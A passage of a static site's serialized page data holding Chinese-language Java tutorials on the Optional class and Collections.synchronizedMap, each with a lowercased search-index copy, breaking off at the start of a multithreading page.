pm.put("key1", null);\n    Optional<Map> mapOptional = Optional.ofNullable(pm);\n    return mapOptional.map(map -> map.get("key1"))\n            .filter(value -> !"".equals(value))\n            .flatMap(value -> {\n                //一大堆业务处理...\n                return Optional.ofNullable("test3成功执行");\n            }).orElse("test3停车了");\n}\npublic static String test4() {\n    //假装外部传入map一个，不传指定key\n    Map pm = new HashMap();\n\n    Optional<Map> mapOptional = Optional.ofNullable(pm);\n    return mapOptional.map(map -> map.get("key1"))\n            .filter(value -> !"".equals(value))\n            .flatMap(value -> {\n                //开始啪啪业务逻辑 发短信啊crud啊...\n                return Optional.ofNullable("test4成功执行");\n            }).orElse("test4停车了");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n输出运行结果：\n\ntest1成功执行\ntest2停车了\ntest3停车了\ntest4停车了\n\n\n1\n2\n3\n4\n',normalizedContent:'> 本文原文地址 www.aqwdzy.com\n\n# 参考资料\n\n * oracle jdk api 参考文档 https://docs.oracle.com/javase/8/docs/api/java/util/optional.html\n * 菜鸟教程 - java 8 optional 类 https://www.runoob.com/java/java8-optional-class.html\n\n# 拓展资料\n\n * java8 - 函数式编程 https://blog.csdn.net/icarusliu/article/details/79495534\n * java8 optional 最佳实践（科学访问） https://medium.com/12-developer-labors/must-read-on-optional-type-b171e1b397bb\n * 正确的使用 java8 中的 optional 类来消除代码中的 null 检查 https://lw900925.github.io/java/java8-optional.html\n * java 8 中的 optional 的优点究竟在哪里？https://www.zhihu.com/question/444199629\n\n\n# java8 新特性之 optional 正确理解和用法\n\n\n# 一、optional 简介\n\noptional 是一个容器对象，可以存储对象、字符串等值，当然也可以存储 null 值。optional 提供很多有用的方法，能帮助我们将 java 中的对象等一些值存入其中，这样我们就不用显式进行空值检测，使我们能够用少量的代码完成复杂的流程。\n\n比如它提供了：\n\n * of() 方法，可以将值存入 optional 容器中，如果存入的值是 null 则抛异常。\n\n * ofnullable() 方法，可以将值存入 optional 容器中，即使值是 null 也不会抛异常。\n\n * get() 方法，可以获取容器中的值，如果值为 null 则抛出异常。\n\n * getelse() 方法，可以获取容器中的值，如果值为 null 则返回设置的默认值。\n\n * ispresent() 方法，该方法可以判断存入的值是否为空。\n\n * … 等等一些其它常用方法，下面会进行介绍。\n\n可以说，使用 optional 可以帮助我们解决业务中，减少值动不动就抛出空指针异常问题，也减少 null 值的判断，提高代码可读性等，这里我们介绍下，如果使用这个 optional 类。\n\n\n# 二、optional 类描述\n\n * optional 类所在包： java.util.optional\n * optional 类声明： public final class optional extends object\n * **optional 类方法：\n\n方法                                                     修饰符&返回值类型         介绍\nempty()                                                static optional   创建一个空的optional实例\nequals(object obj)                                     boolean           返回是否与this相等，是对应true\nfilter(predicate<? super t> predicate)                 optional          如果存在且满足predicate条件则返回自己，否则返回空 optional。\nflatmap(function<? super t,optional> mapper)           optional          如果值存在，返回function返回的结果，否则返回空optional。\nget()                                                  t                 如果optional包裹的值存在，则返回值，否则抛出nosuchelementexception异常。【尽量不要主动调用，如果非要用，还要加上try-catch，不如直接if!=null】\nhashcode()                                             int               如果有值就返回值的hash码，没值返回0\nifpresent(consumer<? super t> consumer)                void              如果有值则调用consumer，没值啥也不干。\nispresent()                                            boolean           返回值是否存在，是对应true\nmap(function<? super t,? extends u> mapper)            optional          如果有值，则将提供的函数应用于该值，如果结果不为空，则返回包含新值的optional\nof(t value)                                            static optional   返回带有该值的optional【如果传入null，会抛出nullpointerexception异常】\nofnullable(t value)                                    static optional   返回带有该值的optional，如果传入null，返回空的optional【如果传入null，不会抛出异常】\norelse(t other)                                        t                 optional中有值返回值，无值返回other\norelseget(supplier<? extends t> other)                 t                 optional中有值返回值，无值调用other，返回调用结果\norelsethrow(supplier<? extends x> exceptionsupplier)   t                 optional中有值返回值，无值抛出你传入的异常\ntostring()                                             string            返回值的字符串形式，适用于调试\n\n\n# 三、optional 常用方法及使用示例\n\n# 1、静态方法 optional.of()\n\n * 方法作用： 为指定的值创建一个指定非 null 值的 optional。\n * 方法描述： of 方法通过工厂方法创建 optional 实例，需要注意的是传入的参数不能为 null，否则抛出 nullpointerexception。\n * ** 返回类型：**optional\n * 示例代码：\n\n调用两个 optional.of() 方法，一个传入正常参数，另一个传入 null 参数：\n\npublic static void main(string[] args) {\n    // 传入正常值，正常返回一个 optional 对象\n    optional<string> optional1 = optional.of("mydlq");\n    \n    // 传入参数为 null，抛出 nullpointerexception.\n    optional optional2 = optional.of(null);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n运行代码，可以观察到控制台输出内容如下：\n\nexception in thread "main" java.lang.nullpointerexception\n\tat java.util.objects.requirenonnull(objects.java:203)\n\tat java.util.optional.<init>(optional.java:96)\n\tat java.util.optional.of(optional.java:108)\n\tat club.mydlq.optionalexample.main(optionalexample.java:12)\n\n\n1\n2\n3\n4\n5\n\n\n可以看到传入正常参数正常返回 optional 对象，传入 null 参数返回 nullpointerexception 异常。\n\n# 2、静态方法 optional.ofnullable()\n\n * 方法作用： 为指定的值创建一个 optional 对象，如果指定的参数为 null，不抛出异常，直接则返回一个空的 optional 对象。\n * 方法描述： ofnullable 方法是和 of 方式一样，都是用于创建 optional 对象，只是传入的参数 null 时，会返回一个空的 optional 对象，而不会抛出 nullpointerexception 异常。\n * 返回类型： optional\n * 示例代码：\n\n调用 optional.ofnullable() 方法，传入 null 参数：\n\npublic static void main(string[] args) {\n    // 传入正常值，正常返回一个 optional 对象\n    optional<string> optional1 = optional.ofnullable("mydlq");\n    \n    // 传入 null 参数，正常返回 optional 对象\n    optional optional2 = optional.ofnullable(null);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n运行代码，可以观察到正常传入值和传入 null 值时，都没有抛出异常。\n\n# 3、对象方法 ispresent()\n\n * 方法作用： 如果值存在则方法会返回 true，否则返回 false。\n * 方法描述： 该方法其实就是用于判断创建 optional 时传入参数的值是否为空，实现代码就简单一行，即 value != null 所以如果不为空则返回 true，否则返回 false。\n * 返回类型： boolean\n * 示例代码：\n\npublic static void main(string[] args) {\n    // 传入正常值，正常返回一个 optional 对象，并使用 ispresent 方法\n    optional optional1 = optional.ofnullable("mydlq");\n    system.out.println("传入正常值返回：" + optional1.ispresent());\n\n    // 传入参数为 null 生成一个 optional 对象，并使用 ispresent 方法\n    optional optional2 = optional.ofnullable(null);\n    system.out.println("传入 null 值返回：" + optional2.ispresent());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n传入正常值返回：true\n传入 null 值返回：false\n\n\n1\n2\n\n\n可以看到传入正常参数时调用 optional 对象的 ispresent 方法时返回 true，传入 null 参数返回 false。\n\n# 4、对象方法 get()\n\n * 方法作用： 如果 optional 有值则将其返回，否则抛出 nosuchelementexception 异常。\n * 方法描述： get 方法内部实现其实就是判断 otpional 对象中的 value 属性是否为 null，如果是就抛出 nosuchelementexception 异常，否则返回这个 value 值。\n * 返回类型： t\n * 示例代码：\n\npublic static void main(string[] args) {\n    // 传入正常值，正常返回一个 optional 对象，并使用 get 方法获取值\n    optional optional1 = optional.ofnullable("mydlq");\n    system.out.println(optional1.get());\n\n    // 传入参数为 null 生成一个 optional 对象，并使用 get 方法获取值\n    optional optional2 = optional.ofnullable(null);\n    system.out.println(optional2.get());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n传入正常参数：mydlq\nexception in thread "main" java.util.nosuchelementexception: no value present\n\tat java.util.optional.get(optional.java:135)\n\tat club.mydlq.optionalexample.main(optionalexample.java:14)\n\n\n1\n2\n3\n4\n\n\nbash 可以观察到传入正常值的 optional 调用 get 方法正常输出值，通过空的 optional 对象使用 get 方法获取值时，抛出 nosuchelementexception 异常。\n\n# 5、对象方法 ifpresent()\n\n * 方法作用： 如果值存在则使用该值调用 consumer , 否则不做任何事情。\n * 方法描述： 该方法 ifpresent(consumer<? super t> consumer) 中参数接收的是 consumer 类，它包含一个接口方法 accept()，该方法能够对传入的值进行处理，但不会返回结果。这里传入参数可以传入 lamdda 表达式或 consumer 对象及实现 consumer 接口的类的对象。\n * 返回类型： void\n * 示例代码：\n\npublic static void main(string[] args) {\n    // 创建 optional 对象，然后调用 optional 对象的 ifpresent 方法，传入 lambda 表达式\n    optional optional1 = optional.ofnullable("mydlq1");\n    optional1.ifpresent((value) -> system.out.println("optional 的值为：" + value));\n\n    // 创建 optional 对象，调用 optional 对象的 ifpresent 方法，传入实现 consumer 匿名内部类\n    optional optional2 = optional.ofnullable("mydlq2");\n    consumer<string> consumer = new consumer() {\n        @override\n        public void accept(object value) {\n            system.out.println("optional 的值为：" + value);\n        }\n    };\n    optional2.ifpresent(consumer);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n运行代码，可以观察到控制台输出内容如下：\n\noptional 的值为：mydlq1\noptional 的值为：mydlq2\n\n\n1\n2\n\n\n可以观察到，调用 ifpresent 使用 lambda 或者内部匿名类方法，都是为了再执行 optional 对象的 ifpresent 方法时，执行一段代码逻辑。\n\n# 6、对象方法 orelse()\n\n * 方法作用： 如果该值存在就直接返回， 否则返回指定的其它值。\n * 方法描述： orelse 方法实现很简单，就是使用三目表达式对传入的参数值进行 null 验证，即 value != null ? value : other; 如果为 null 则返回 true，否则返回 false。\n * 返回类型： t\n * 示例代码：\n\npublic static void main(string[] args) {\n    // 传入正常参数，获取一个 optional 对象，并使用 orelse 方法设置默认值\n    optional optional1 = optional.ofnullable("mydlq");\n    object object1 = optional1.orelse("默认值");\n    system.out.println("如果值不为空："+object1);\n\n    // 传入 null 参数，获取一个 optional 对象，并使用 orelse 方法设置默认值\n    optional optional2 = optional.ofnullable(null);\n    object object2 = optional2.orelse("默认值");\n    system.out.println("如果值为空："+object2);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n如果值不为空：mydlq\n如果值为空：默认值\n\n\n1\n2\n\n\n可以观察到，如果 optional 的值为空，则返回 orelse() 方法设置的默认值，否则返回 optional 中的值。\n\n# 7、对象方法 orelseget()\n\n * 方法作用： 如果该值存在就返回值，否则触发 other，并返回 other 调用的结果。\n * 方法描述： orelseget 方法和 orelse 方法类似，都是在 optional 值为空时，返回一个默认操作，只不过 orelse 返回的是默认值，而 orelseget 是执行 lambda 表达式，然后返回 lambda 表达式执行后的结果。\n * 返回类型： t\n * 示例代码：\n\npublic static void main(string[] args) {\n    // 传入正常参数，获取一个 optional 对象，并使用 orelse 方法设置默认值\n    optional optional1 = optional.ofnullable("mydlq");\n    object object1 = optional1.orelseget(() -> {\n        string defaultval = "执行逻辑和生成的默认值";\n        return defaultval;\n    });\n    system.out.println("输出的值为："+object1);\n\n    // 传入 null 参数，获取一个 optional 对象，并使用 orelse 方法设置默认值\n    optional optional2 = optional.ofnullable(null);\n    object object2 = optional2.orelseget(() -> {\n        string defaultval = "执行逻辑和生成的默认值";\n        return defaultval;\n    });\n    system.out.println("输出的值为："+object2);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n输出的值为：mydlq\n输出的值为：执行逻辑和生成的默认值\n\n\n1\n2\n\n\n可也观察到，当 optional 值为不为空时正常返回带值的 optional，如果 optional 为空则返回 orelseget 方法中 lambda 表达式执行后生成的值。\n\n# 8、对象方法 orelsethrow()\n\n * 方法作用： 如果 optional 存在该值，返回包含的值，否则抛出由 supplier 继承的异常。\n * 方法描述： orelsethrow 方法其实就是判断创建 optional 时传入的参数是否为 null，如果是非 null 则返回传入的值，否则抛出 异常。\n * 返回类型： t\n * 示例代码：\n\npublic static void main(string[] args) {\n    // 传入正常参数，获取一个 optional 对象，并使用 orelsethrow 方法\n    try {\n        optional optional1 = optional.ofnullable("mydlq");\n        object object1 = optional1.orelsethrow(() -> {\n                    system.out.println("执行逻辑，然后抛出异常");\n                    return new runtimeexception("抛出异常");\n                }\n        );\n        system.out.println("输出的值为：" + object1);\n    } catch (throwable throwable) {\n        throwable.printstacktrace();\n    }\n    \n    // 传入 null 参数，获取一个 optional 对象，并使用 orelsethrow 方法\n    try {\n        optional optional2 = optional.ofnullable(null);\n        object object2 = optional2.orelsethrow(() -> {\n                    system.out.println("执行逻辑，然后抛出异常");\n                    return new runtimeexception("抛出异常");\n                }\n        );\n        system.out.println("输出的值为：" + object2);\n    } catch (throwable throwable) {\n        throwable.printstacktrace();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n值为不为空输出的值：mydlq\n执行逻辑，然后抛出异常\njava.lang.runtimeexception: 抛出异常\n\tat club.mydlq.optionalexample.lambda$main$1(optionalexample.java:25)\n\tat java.util.optional.orelsethrow(optional.java:290)\n\tat club.mydlq.optionalexample.main(optionalexample.java:23)\n\n\n1\n2\n3\n4\n5\n6\n\n\n可以观察到，当创建 optional 时如果传入的参数为空则执行 lambda 表达式代码逻辑后抛出异常信息，否则返回传入的参数值。\n\n# 9、对象方法 map()\n\n * 方法作用： 如果有值，则对其执行调用映射函数得到返回值。如果返回值不为 null，则创建包含映射返回值的 optional 作为 map 方法返回值，否则返回空 optional。\n * 方法描述： map 方法主要用于获取某个对象中的某个属性值的 optional 对象时使用。map 方法调用时，首先验证传入的映射函数是否为空，如果为空则抛出异常。然后，再检测 optional 的 value 是否为空，如果是，则返回一个空 value 的 optional 对象。如果传入的映射函数和 optinal 的 value 都不为空，则返回一个带 value 对象属性的 optional 对象。\n * 返回类型： optional\n * 示例代码：\n\n示例 1： 创建 map 集合，存储一些键值对信息，通过 optional 操作 map 获取值，然后观察：\n\npublic static void main(string[] args) {\n    // 创建 map 对象\n    map<string, string> usermap = new hashmap<>();\n    usermap.put("name1", "mydlq");\n    usermap.put("name2", null);\n\n    // 传入 map 对象参数，获取一个 optional 对象，获取 name1 属性\n    optional<string> optional1 = optional.of(usermap).map(value -> value.get("name1"));\n\n    // 传入 map 对象参数，获取一个 optional 对象，获取 name2 属性\n    optional<string> optional2 = optional.of(usermap).map(value -> value.get("name2"));\n\n    // 获取 optional 的值\n    system.out.println("获取的 name1 的值：" + optional1.orelse("默认值"));\n    system.out.println("获取的 name2 的值：" + optional2.orelse("默认值"));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n获取的 optional 的值：mydlq\n获取的 optional 的值：默认值\n\n\n1\n2\n\n\n示例 2： 创建一个用户类，使用 optional 操作用户对象，获取其 name 参数，结合 optional 的 map 方法获取值，进行观察：\n\npublic class user {\n\n    private string name;\n\n    public user(string name) {\n        this.name = name;\n    }\n\n    public string getname() {\n        return name;\n    }\n    public void setname(string name) {\n        this.name = name;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n使用 optional 的 map 方法对值处理：\n\npublic static void main(string[] args) {\n    // 创建一个对象，设置姓名属性而不设置性别，这时候性别为 null\n    user user1 = new user("测试名称");\n    user user2 = new user();\n\n    // 使用 optional 存储 user 对象\n    optional<user> optional1 = optional.ofnullable(user1);\n    optional<user> optional2 = optional.ofnullable(user2);\n\n    // 获取对象的 name 属性值\n    string name1 = optional1.map(user::getname).orelse("未填写");\n    string name2 = optional2.map(user::getname).orelse("未填写");\n\n    // 输出结果\n    system.out.println("获取的名称：" + name1);\n    system.out.println("获取的名称：" + name2);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n获取的名称：测试名称\n获取的名称：未填写\n\n\n1\n2\n\n\n总结：\n\n通过上面两个示例观察到，通过 optional 对象的 map 方法能够获取映射对象中的属性，创建 optional 对象，并以此属性充当 optional 的值，结合 orelse 方法，如果获取的属性的值为空，则设置个默认值。\n\n# 10、对象方法 flatmap()\n\n * 方法作用： 如果值存在，返回基于 optional 包含的映射方法的值，否则返回一个空的 optional。\n * 方法描述： flatmap 方法和 map 方法类似，唯一的不同点就是 map 方法会对返回的值进行 optional 封装，而 flatmap 不会，它需要手动执行 optional.of 或 optional.ofnullable 方法对 optional 值进行封装。\n * 返回类型： optional\n * 示例代码：\n\npublic static void main(string[] args) {\n    // 创建 map 对象\n    map<string, string> usermap = new hashmap<>();\n    usermap.put("name", "mydlq");\n    usermap.put("sex", "男");\n\n    // 传入 map 对象参数，获取一个 optional 对象\n    optional<map<string, string>> optional1 = optional.of(usermap);\n\n    // 使用 optional 的 flatmap 方法，获取 map 中的 name 属性\n    // 然后通过获取的值手动创建一个新的 optional 对象\n    optional optional2 = optional1.flatmap(value -> optional.ofnullable(value.get("name")));\n\n    // 获取 optional 的 value\n    system.out.println("获取的 optional 的值：" + optional2.get());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n获取的 optional 的值：mydlq\n\n\n1\n\n\n根据结果观察，可以看到 flatmap 和 map 方法没有什么区别，但是仔细看，代码中调用 flatmap 后，需要手动执行 of 或 ofnullable 方法创建了 optional 对象。\n\n# 11、对象方法 filter()\n\n * 方法作用： 如果有值并且满足断言条件返回包含该值的 optional，否则返回空 optional。\n * 方法描述： filter 方法通过传入的限定条件对 optional 实例的值进行过滤，如果 optional 值不为空且满足限定条件就返回包含值的 optional，否则返回空的 optional。这里设置的限定条件需要使用实现了 predicate 接口的 lambda 表达式来进行配置。\n * 返回类型： optional\n * 示例代码：\n\npublic static void main(string[] args) {\n    // 创建一个测试的 optional 对象\n    optional<string> optional = optional.ofnullable("mydlq");\n    // 调用 optional 的 filter 方法，设置一个满足的条件，然后观察获取的 optional 对象值是否为空\n    optional optional1 =optional.filter((value) -> value.length() > 2);\n    system.out.println("optional 的值不为空：：" + optional.ispresent());\n\n    // 调用 optional 的 filter 方法，设置一个不满足的条件，然后观察获取的 optional 对象值是否为空\n    optional optional2 =optional.filter((value) -> value.length() <2);\n    system.out.println("optional 的值不为空：：" + optional2.ispresent());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n运行代码，可以观察到控制台输出内容如下：\n\noptional 的值不为空：true\noptional 的值不为空：false\n\n\n1\n2\n\n\n根据结果可以观察到，可以通过 filter 设置一个条件来判断 optional 的值，如果满足条件就返回带值的 optional，否则返回空的 optional。\n\n\n# 四、optional 常用示例组合\n\n在介绍一栏中已经说过 optional 是个容器，它可用保存类型的 t 的值，即使 t 为 null 也可以使用 optional 存储，这样我就不用显示进行空值检测，防止空指针异常。\n\n上面也介绍了 optional 的各种方法，在实际使用中这些方法常常组合使用。且很多方法也常与 lambda 表达式结合，获取我们想要的结果的值。\n\n下面是常用的示例，可以作为参考：\n\n# 对集合中的对象属性进行过滤\n\n创建一个 user 对象实体类，里面包含 name 属性：\n\npublic class user {\n    private string name;\n\n    public user(string name) {\n        this.name = name;\n    }\n\n    public string getname() {\n        return name;\n    }\n    public void setname(string name) {\n        this.name = name;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n创建一个使用 main 方法的类，创建几个 user 对象且设置不同的值，有的对象为 null 有的属性不设置，然后通过 optional 获取 name 属性值加入集合，进行测试：\n\nimport java.util.arraylist;\nimport java.util.list;\nimport java.util.optional;\n\npublic class optionalexample {\n\n    /**\n     * 测试的 main 方法\n     */\n    public static void main(string[] args) {\n        // 创建一个测试的用户集合\n        list<user> userlist = new arraylist<>();\n\n        // 创建几个测试用户\n        user user1 = new user("abc");\n        user user2 = new user("efg");\n        user user3 = null;\n\n        // 将用户加入集合\n        userlist.add(user1);\n        userlist.add(user2);\n        userlist.add(user3);\n\n        // 创建用于存储姓名的集合\n        list<string> namelist = new arraylist();\n        // 循环用户列表获取用户信息，值获取不为空且用户以 a 开头的姓名，\n        // 如果不符合条件就设置默认值，最后将符合条件的用户姓名加入姓名集合\n        for (user user : userlist) {\n            namelist.add(optional.ofnullable(user).map(user::getname).filter(value -> value.startswith("a")).orelse("未填写"));\n        }\n\n        // 输出名字集合中的值\n        system.out.println("通过 optional 过滤的集合输出：");\n        namelist.stream().foreach(system.out::println);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n输出运行结果：\n\n通过 optional 过滤的集合输出：\nabc\n未填写\n未填写\n\n\n1\n2\n3\n4\n\n\n通过上面，可以观察到，使用 optional 有时候可以很方便的过滤一些属性，而且它的方法可以通过链式调用，方法间相互组合使用，使我们用少量的代码就能完成复杂的逻辑。\n\n# map 经典判空之嵌套 if\n\n判断 map 不为空，map 中的 key-value 不为 null 且不为空白字符串，常规玩法要么是一组嵌套 if，要是是一个 tay-catch，\n\npublic static void main(string[] args) {\n    system.out.println(test1());\n    system.out.println(test2());\n    system.out.println(test3());\n    system.out.println(test4());\n}\npublic static string test1() {\n    //假装外部传入不可控map一个，比如sevlet接受前端传参\n    map pm = new hashmap();\n    pm.put("key1", "value1");\n\n\n    optional<map> mapoptional = optional.ofnullable(pm);\n\n    return mapoptional.map(map -> map.get("key1"))\n            .filter(value -> !"".equals(value))\n            .flatmap(value -> {\n                //一大堆业务处理...\n                return optional.ofnullable("test1成功执行");\n            }).orelse("test1停车了");\n}\n\npublic static string test2() {\n    //假装外部传入不可控map一个，比如sevlet接受前端传参\n    map pm = new hashmap();\n    pm.put("key1", "");\n    optional<map> mapoptional = optional.ofnullable(pm);\n    return mapoptional.map(map -> map.get("key1"))\n            .filter(value -> !"".equals(value))\n            .flatmap(value -> {\n                //一大堆业务处理...\n                return optional.ofnullable("test2成功执行");\n            }).orelse("test2停车了");\n}\n\n\npublic static string test3() {\n    //假装外部传入不可控map一个，比如sevlet接受前端传参\n    map pm = new hashmap();\n    pm.put("key1", null);\n    optional<map> mapoptional = optional.ofnullable(pm);\n    return mapoptional.map(map -> map.get("key1"))\n            .filter(value -> !"".equals(value))\n            .flatmap(value -> {\n                //一大堆业务处理...\n                return optional.ofnullable("test3成功执行");\n            }).orelse("test3停车了");\n}\npublic static string test4() {\n    //假装外部传入map一个，不传指定key\n    map pm = new hashmap();\n\n    optional<map> mapoptional = optional.ofnullable(pm);\n    return mapoptional.map(map -> map.get("key1"))\n            .filter(value -> !"".equals(value))\n            .flatmap(value -> {\n                //开始啪啪业务逻辑 发短信啊crud啊...\n                return optional.ofnullable("test4成功执行");\n            }).orelse("test4停车了");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n输出运行结果：\n\ntest1成功执行\ntest2停车了\ntest3停车了\ntest4停车了\n\n\n1\n2\n3\n4\n',charsets:{cjk:!0},lastUpdated:"2022/06/06, 20:20:01",lastUpdatedTimestamp:1654518001e3},{title:"synchronizedMap()",frontmatter:{title:"synchronizedMap()",date:"2022-04-17T23:33:06.000Z",permalink:"/pages/4cb11b/",categories:["java","集合"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/02.%E9%9B%86%E5%90%88/01.Collections.synchronizedMap().html",relativePath:"04.java/02.集合/01.Collections.synchronizedMap().md",key:"v-5fa09f51",path:"/pages/4cb11b/",headersStr:null,content:'> 我们知道hashMap是非线程安全的，为了实现线程安全，无非就是以下三种方式： Hashtable 、ConcurrentHashMap 、SynchronizedMap 这篇文章主要讲解SynchronizedMap是怎么实现线程安全的\n\nSynchronizedMap用法：\n\n HashMap hashMap = new HashMap<String, String>();\n     hashMap.put("one", "1");\n     hashMap.put("two", "2");\n     Map<String, String> map =  Collections.synchronizedMap(hashMap);\n     Log.e("iterator", map.get("one"));\n     Log.e("iterator", map.get("two"));\n\n\n1\n2\n3\n4\n5\n6\n\n\n> Collections.synchronizedMap(hashMap)用来创建SynchronizedMap对象\n\nSynchronizedMap源码：\n\n// synchronizedMap方法\npublic static <K,V> Map<K,V> synchronizedMap(Map<K,V> m) {\n       return new SynchronizedMap<>(m);\n   }\n// SynchronizedMap类\nprivate static class SynchronizedMap<K,V>\n       implements Map<K,V>, Serializable {\n       private static final long serialVersionUID = 1978198479659022715L;\n\n       private final Map<K,V> m;     // Backing Map\n       final Object      mutex;        // Object on which to synchronize\n\n       SynchronizedMap(Map<K,V> m) {\n           this.m = Objects.requireNonNull(m);\n           mutex = this;\n       }\n\n       SynchronizedMap(Map<K,V> m, Object mutex) {\n           this.m = m;\n           this.mutex = mutex;\n       }\n\n       public int size() {\n           synchronized (mutex) {return m.size();}\n       }\n       public boolean isEmpty() {\n           synchronized (mutex) {return m.isEmpty();}\n       }\n       public boolean containsKey(Object key) {\n           synchronized (mutex) {return m.containsKey(key);}\n       }\n       public boolean containsValue(Object value) {\n           synchronized (mutex) {return m.containsValue(value);}\n       }\n       public V get(Object key) {\n           synchronized (mutex) {return m.get(key);}\n       }\n\n       public V put(K key, V value) {\n           synchronized (mutex) {return m.put(key, value);}\n       }\n       public V remove(Object key) {\n           synchronized (mutex) {return m.remove(key);}\n       }\n       // 省略其他方法\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n> 可以看到synchronizedMap内部所有的方法其实都是执行我们传入的map对象的方法，只不过都用synchronized 进行上锁。这里就是使用到了java的代理模式。',normalizedContent:'> 我们知道hashmap是非线程安全的，为了实现线程安全，无非就是以下三种方式： hashtable 、concurrenthashmap 、synchronizedmap 这篇文章主要讲解synchronizedmap是怎么实现线程安全的\n\nsynchronizedmap用法：\n\n hashmap hashmap = new hashmap<string, string>();\n     hashmap.put("one", "1");\n     hashmap.put("two", "2");\n     map<string, string> map =  collections.synchronizedmap(hashmap);\n     log.e("iterator", map.get("one"));\n     log.e("iterator", map.get("two"));\n\n\n1\n2\n3\n4\n5\n6\n\n\n> collections.synchronizedmap(hashmap)用来创建synchronizedmap对象\n\nsynchronizedmap源码：\n\n// synchronizedmap方法\npublic static <k,v> map<k,v> synchronizedmap(map<k,v> m) {\n       return new synchronizedmap<>(m);\n   }\n// synchronizedmap类\nprivate static class synchronizedmap<k,v>\n       implements map<k,v>, serializable {\n       private static final long serialversionuid = 1978198479659022715l;\n\n       private final map<k,v> m;     // backing map\n       final object      mutex;        // object on which to synchronize\n\n       synchronizedmap(map<k,v> m) {\n           this.m = objects.requirenonnull(m);\n           mutex = this;\n       }\n\n       synchronizedmap(map<k,v> m, object mutex) {\n           this.m = m;\n           this.mutex = mutex;\n       }\n\n       public int size() {\n           synchronized (mutex) {return m.size();}\n       }\n       public boolean isempty() {\n           synchronized (mutex) {return m.isempty();}\n       }\n       public boolean containskey(object key) {\n           synchronized (mutex) {return m.containskey(key);}\n       }\n       public boolean containsvalue(object value) {\n           synchronized (mutex) {return m.containsvalue(value);}\n       }\n       public v get(object key) {\n           synchronized (mutex) {return m.get(key);}\n       }\n\n       public v put(k key, v value) {\n           synchronized (mutex) {return m.put(key, value);}\n       }\n       public v remove(object key) {\n           synchronized (mutex) {return m.remove(key);}\n       }\n       // 省略其他方法\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n> 可以看到synchronizedmap内部所有的方法其实都是执行我们传入的map对象的方法，只不过都用synchronized 进行上锁。这里就是使用到了java的代理模式。',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java 多线程的基本使用",frontmatter:{title:"java 多线程的基本使用",date:"2022-04-17T23:33:06.000Z",permalink:"/pages/c888ad/",categories:["java","多线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/03.%E5%A4%9A%E7%BA%BF%E7%A8%8B/00.java%20%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html",relativePath:"04.java/03.多线程/00.java 多线程的基本使用.md",key:"v-1ee927b6",path:"/pages/c888ad/",headers:[{level:2,title:"1. 创建线程",slug:"_1-创建线程",normalizedTitle:"1. 创建线程",charIndex:2},{level:3,title:"1.1 创建线程的两种方式",slug:"_1-1-创建线程的两种方式",normalizedTitle:"1.1 创建线程的两种方式",charIndex:14},{level:2,title:"2. 